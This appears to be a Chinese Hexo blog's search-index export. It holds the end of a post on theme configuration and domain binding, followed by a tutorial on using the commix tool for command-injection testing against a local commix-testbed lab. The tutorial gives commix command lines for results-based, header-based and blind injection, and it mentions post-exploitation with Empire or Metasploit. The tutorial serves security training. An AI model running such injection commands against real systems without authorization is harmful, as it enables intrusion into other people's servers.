zero#creative_commons: by-nc-sa#creative_commons:sidebar: # Sidebar Position, available value: left | right position: left #position: right # Sidebar Display, available value: # - post expand on posts automatically. Default. # - always expand for all pages automatically # - hide expand only when click on the sidebar toggle icon. # - remove Totally remove sidebar including sidebar toggler. display: post #display: always #display: hide #display: remove# Blogrolls#links_title: Links#links_layout: block#links_layout: inline#links: #Title: http://example.com/# ---------------------------------------------------------------# Post Settings# ---------------------------------------------------------------# Automatically scroll page to section which is under &lt;!-- more --&gt; mark.scroll_to_more: true# Automatically excerpt description in homepage as preamble text.excerpt_description: true# Automatically Excerpt. Not recommand.# Please use &lt;!-- more --&gt; in the post to control excerpt accurately.auto_excerpt: enable: false length: 150# Post meta display settingspost_meta: item_text: true created_at: true updated_at: false categories: true# Wechat Subscriber#wechat_subscriber: #enabled: true #qcode: /path/to/your/wechatqcode ex. /uploads/wechat-qcode.jpg #description: ex. subscribe to my blog by scanning my public wechat account# ---------------------------------------------------------------# Misc Theme Settings# ---------------------------------------------------------------# Custom Logo.# !!Only available for Default Scheme currently.# Options:# enabled: [true/false] - Replace with specific image# image: url-of-image - Images's urlcustom_logo: enabled: false image:# Code Highlight theme# Available value:# normal | night | night eighties | night blue | night bright# https://github.com/chriskempson/tomorrow-themehighlight_theme: normal# ---------------------------------------------------------------# Third Party Services Settings# ---------------------------------------------------------------# MathJax Supportmathjax: enable: false per_page: false cdn: //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML#local searchsearch: path: search.xml field: post format: html limit: 10000# Swiftype Search API Key#swiftype_key: oUgCiUNA9jix_1j3uXpn# Baidu Analytics IDbaidu_analytics: # Duoshuo ShortNameduoshuo_shortname: # Disqus#disqus_shortname:# Hypercomments#hypercomments_id:# Gentie productKey#gentie_productKey:# Support for youyan comments system.# You can get your uid from http://www.uyan.cc#youyan_uid: your uid# Baidu Share# Available value:# button | slide# Warning: Baidu Share does not support https.#baidushare:## type: button# Share#jiathis:# Warning: JiaThis does not support https.#add_this_id:# Share#duoshuo_share: true# Google Webmaster tools verification setting# See: https://www.google.com/webmasters/#google_site_verification:# Google Analytics#google_analytics:# CNZZ count#cnzz_siteid:# Application Insights# See https://azure.microsoft.com/en-us/services/application-insights/# application_insights:# Make duoshuo show UA# user_id must NOT be null when admin_enable is true!# you can visit http://dev.duoshuo.com get duoshuo user id.duoshuo_info: ua_enable: true admin_enable: false user_id: 0 #admin_nickname: Author# Facebook SDK Support.# https://github.com/iissnan/hexo-theme-next/pull/410facebook_sdk: enable: false app_id: #&lt;app_id&gt; fb_admin: #&lt;user_id&gt; like_button: #true webmaster: #true# Facebook comments plugin# This plugin depends on Facebook SDK.# If facebook_sdk.enable is false, Facebook comments plugin is unavailable.facebook_comments_plugin: enable: false num_of_posts: 10 # min posts num is 1 width: 100% # default width is 550px scheme: light # default scheme is light (light or dark)# Show number of visitors to each article.# You can visit https://leancloud.cn get AppID and AppKey.leancloud_visitors: enable: true app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt;# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: false # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class="fa fa-user"&gt;&lt;/i&gt; site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class="fa fa-eye"&gt;&lt;/i&gt; site_pv_footer: # custom pv span for one page only page_pv: true page_pv_header: &lt;i class="fa fa-file-o"&gt;&lt;/i&gt; page_pv_footer:# Tencent analytics ID# tencent_analytics:# Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEObaidu_push: false# Google Calendar# Share your recent schedule to others via calendar page## API Documentation:# https://developers.google.com/google-apps/calendar/v3/reference/events/listcalendar: enable: false calendar_id: &lt;required&gt; api_key: &lt;required&gt; orderBy: startTime offsetMax: 24 offsetMin: 4 timeZone: showDeleted: false singleEvents: true maxResults: 250# Algolia Searchalgolia_search: enable: false hits: per_page: 10 labels: input_placeholder: Search for Posts hits_empty: "We didn't find any results for the search: $&#123;query&#125;" hits_stats: "$&#123;hits&#125; results found in $&#123;time&#125; ms"#! ---------------------------------------------------------------#! DO NOT EDIT THE FOLLOWING SETTINGS#! UNLESS YOU KNOW WHAT YOU ARE DOING#! ---------------------------------------------------------------# Motionuse_motion: true# Fancyboxfancybox: true# Canvas-nestcanvas_nest: false# Script Vendors.# Set a CDN address for the vendor you want to customize.# For example# jquery: https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js# Be aware that you should use the same version as internal ones to avoid potential problems.# Please use the https protocol of CDN files when you enable https on your site.vendors: # Internal path prefix. Please do not edit it. _internal: lib # Internal version: 2.1.3 jquery: # Internal version: 2.1.5 # See: http://fancyapps.com/fancybox/ fancybox: fancybox_css: # Internal version: 1.0.6 # See: https://github.com/ftlabs/fastclick fastclick: # Internal version: 1.9.7 # See: https://github.com/tuupola/jquery_lazyload lazyload: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity_ui: # Internal version: 0.7.9 # See: https://faisalman.github.io/ua-parser-js/ ua_parser: # Internal version: 4.6.2 # See: http://fontawesome.io/ fontawesome: # Internal version: 1 # https://www.algolia.com algolia_instant_js: algolia_instant_css: # Internal version: 1.0.0 # https://github.com/hustcc/canvas-nest.js canvas_nest:# Assetscss: cssjs: jsimages: images# Theme versionversion: 5.1.0 个性化设置按照NexT 使用文档设置一下，其中的内容下面不再赘述。 绑定个人域名1、在source文件夹中新建一个CNAME文件（无后缀名），然后用文本编辑器打开，在首行添加你的网站域名，如http://xxxx.com，注意前面没有http://，也没有www，然后使用hexo g &amp;&amp; hexo d上传部署。2、在域名解析提供商，下面以dnspod为例。（1）先添加一个CNAME，主机记录写@，后面记录值写上你的http://xxxx.github.io（2）再添加一个CNAME，主机记录写www，后面记录值也是http://xxxx.github.io这样别人用www和不用www都能访问你的网站（其实www的方式，会先解析成http://xxxx.github.io，然后根据CNAME再变成http://xxx.com，即中间是经过一次转换的）。上面，我们用的是CNAME别名记录，也有人使用A记录，后面的记录值是写github page里面的ip地址，但有时候IP地址会更改，导致最后解析不正确，所以还是推荐用CNAME别名记录要好些，不建议用IP。3、等十分钟左右，刷新浏览器，用你自己域名访问下试试(参考)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[commix-系统命令注入自动化测试实例]]></title>
      <url>%2F2017%2F01%2F21%2Fcommix-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B%2F</url>
      <content type="text"><![CDATA[引言​ commix是一款很好用的命令注入的工具，前几天看了看国内对其的介绍和使用示例挺少的，所以最近有空就写了这一篇文章来列举几个使用的栗子。 概念​ 命令注入就是部分Web应用程序提供了一些命令执行的操作，那么在Web应用程序底层去调用系统操作命令时，如果没有过滤好用户输入的数据，就很有可能形成系统命令执行漏洞来直接执行操作系统命令。详细讲解参考Command Injection commix简介​ 此处就不详细介绍了如果想要了解可以看这两篇文章： ​ http://www.mottoin.com/91981.html ​ http://www.mottoin.com/91806.html 测试环境搭建​ 在这里你可以使用DVWA或者DWAPP来实战，当然我觉得要尽可能全的包含各种类型的命令注入漏洞才算完美所以我们在此处使用commix提供的一个测试平台commix-testbed。 1.如果你在使用windows平台那么我推荐PHPStudy来搭建环境 安装完成后你只需要在phpstudy的www目录下打开cmd键入： git clone https://github.com/commixproject/commix-testbed.git (当然你要确保你安装了Git) 之后只要启动phpstudy就可以在浏览器中访问了 2.如果你使用的是Linux或者MacOS平台我推荐用xampp来搭建环境 搭建好之后你就可以看到如下界面 环境搭建好后我们来进行渗透测试 示例一：Results-based命令注入攻击我们选择GET方式的Classic regular example ping下127.0.0.1试下 复制url并打开commix开始hack 渗透主机为win后期可以借助empire（不知道empire？？？没关系戳我） 可以使用 commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/classic.php?addr=127.0.0.1&quot; --hostname --current-user --sys-info 含义：显示当前测试主机的主机名，用户名和系统信息 如果渗透主机为Linux则后期可以借助msf(不会msf？？？没关系戳我) 示例二：User-Agent HTTP头注入攻击选择User-Agent HTTP Header中的第一个Classic user-agent-based example http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php 然后开始使用commix注入： commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot; 含义：post参数addr=192.168.1.121并指定要使用的进样技术 效果如下： 示例三：Referer HTTP头注入攻击选择Referer HTTP Header中的第一个Classic referer-based example http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php 然后开始使用commix注入： commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot; 和上面的差不多不解释了 效果如下： 示例四：Blind 命令注入攻击选择Regular (GET / POST)中的Blind regular example http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1 然后开始使用commix注入： commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1&quot; --technique=&quot;tf&quot; -v 1 效果如下： 执行命令： 彩蛋上面的例子不是很全，有几个使用commix进行命令注入的视频，有兴趣可以下载看下 链接: https://pan.baidu.com/s/1qXMNjZm 密码: 5peb 参考https://github.com/commixproject/commix-testbed https://github.com/commixproject/commix http://www.commixproject.com/]]></content>
    </entry>

    
  
  
    
  
</search>
